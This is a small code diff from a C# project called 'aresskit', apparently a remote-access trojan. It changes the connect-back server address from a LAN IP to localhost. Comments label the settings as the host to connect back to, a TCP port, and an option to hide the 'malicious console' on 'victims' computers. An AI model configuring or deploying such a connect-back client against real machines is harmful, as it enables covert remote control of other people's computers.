@@ -6,7 +6,7 @@ namespace aresskit
     {
         static void Main()
         {
-            Core.VicServer = "192.168.1.65"; // Server Hostname or IP Address to connect back to.
+            Core.VicServer = "localhost"; // Server Hostname or IP Address to connect back to.
             Core.VicPort = 9000; // TCP Port to connect back to.
             Core.HideConsole = false; // Show/Hide malicious console on Clients (victims) computer.
             Core.CMDSplitter = "::"; // Characters to split Class/Method in command input (ex: Administration::IsAdmin or Administration->IsAdmin)
